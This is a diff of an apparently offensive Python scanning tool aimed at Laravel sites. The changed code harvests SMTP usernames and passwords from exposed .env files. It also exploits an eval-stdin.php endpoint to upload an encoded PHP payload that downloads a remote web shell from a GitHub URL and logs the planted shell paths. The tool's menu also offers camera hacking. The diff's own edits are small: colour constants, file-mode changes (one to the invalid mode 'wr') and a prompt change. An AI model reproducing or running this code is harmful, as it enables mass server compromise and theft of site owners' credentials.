@@ -10,6 +10,27 @@ import sys, re, time
 
 
 
+Black="\033[0;30m" 
+Red="\033[0;31m" 
+Green="\033[0;32m" 
+Yellow="\033[0;33m"
+Blue="\033[0;34m" 
+Purple="\033[0;35m" 
+Cyan="\033[0;36m" 
+White="\033[0;37m" 
+
+
+
+
+		#########bold
+BBlack="\033[1;30m" 
+BRed="\033[1;31m" 
+BGreen="\033[1;32m" 
+BYellow="\033[1;33m" 
+BBlue="\033[1;34m" 
+BPurple="\033[1;35m" 
+BCyan="\033[1;36m" 
+BWhite="\033[1;37m" 
 
 ###########################
 #####################
@@ -344,12 +365,12 @@ class lavarel_vunl():
 					screenlock.acquire()
 					print("\033[1;33m[\033[1;36mFound-SMTP\033[1;33m]  \033[1;32m"+verdino)
 					smtp=smtp+1
-					smtp_file=open("Result/smtp.txt", "a")
+					smtp_file=open("Result/smtp.txt", "w")
 					_9irch = verdino.replace(".env","")
 					save_the_mnanok = _9irch+" [Host:"+DNS_host+" Port:"+port_smtp+" Username:"+username_smtp+" Password: "+password_smtp+" ]"
 					smtp_file.write(save_the_mnanok+"\n")
 					smtp_file.close()
-					file_all_env=open("Result/{}:{}-{}-{}:{}-{}-{}.txt".format(DNS_host,year,mounth,day,hour,mins,sec), "a")
+					file_all_env=open("Result/{}:{}-{}-{}:{}-{}-{}.txt".format(DNS_host,year,mounth,day,hour,mins,sec), "w")
 					file_all_env.write(_9or9a3)
 					screenlock.release()
 
@@ -384,7 +405,7 @@ class lavarel_vunl():
 				print("\033[1;33m[\033[1;36mFound-Vuln\033[1;33m]  \033[1;32m"+url)
 				screenlock.release()
 				vulnerable=vulnerable+1
-				vuln_file=open("Result/vuln.txt", "a")
+				vuln_file=open("Result/vuln.txt", "wr")
 				vuln_file.write(url+"\n")
 				vuln_file.close()
 				shell_file="<?php eval('?>'.base64_decode('PD9waHANCmZ1bmN0aW9uIGFkbWluZXIoJHVybCwgJGlzaSkgew0KCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7DQoJJGNoID0gY3VybF9pbml0KCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOw0KCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsNCgljdXJsX2Nsb3NlKCRjaCk7DQoJZmNsb3NlKCRmcCk7DQoJb2JfZmx1c2goKTsNCglmbHVzaCgpOw0KfQ0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h5b3Vlei9MaW51eFNlYy9tYXN0ZXIvYmF5LnBocCIsInNoM2xsLnBocCIpKSB7DQoJZWNobyAiU3Vrc2VzIjsNCn0gZWxzZSB7DQoJZWNobyAiZmFpbCI7DQp9DQo/Pg==')); ?>"
@@ -394,7 +415,7 @@ class lavarel_vunl():
 					print("\033[1;33m[\033[1;36mSpawned\033[1;33m]  \033[1;32mShell was Uploaded Successfully")
 					screenlock.release()
 					shell=shell+1
-					shell_rezult=open("Result/shells.txt", "a")
+					shell_rezult=open("Result/shells.txt", "w")
 					pathshell = url.replace("eval-stdin.php","sh3ll.php")
 					shell_rezult.write(pathshell+"\n")
 					shell_rezult.close()
@@ -650,7 +671,7 @@ class main(Thread):
 		print("{}7{}-{}Lavarel SMTP Dumper And Shell Uploader".format("\033[1;32m","\033[1;33m","\033[1;36m"))
 		print("{}8{}-{}kc Finder".format("\033[1;32m","\033[1;33m","\033[1;36m"))
 		print("{}9{}-{}Random Cam Hacking".format("\033[1;32m","\033[1;33m","\033[1;36m"))
-		choise=int(input("\033[1;33m[\033[1;34m*\033[1;33m]\033[1;33mSelect Number 1 to 9: \033[1;32m"))
+		choise=int(input("\033[1;33m[\033[1;34m*\033[1;33m]\033[1;33mSelect Number 1 to 5: \033[1;32m"))
 
 		if choise == 1:
 			#sqli_brute_and_scan().brute_sites_sqli()
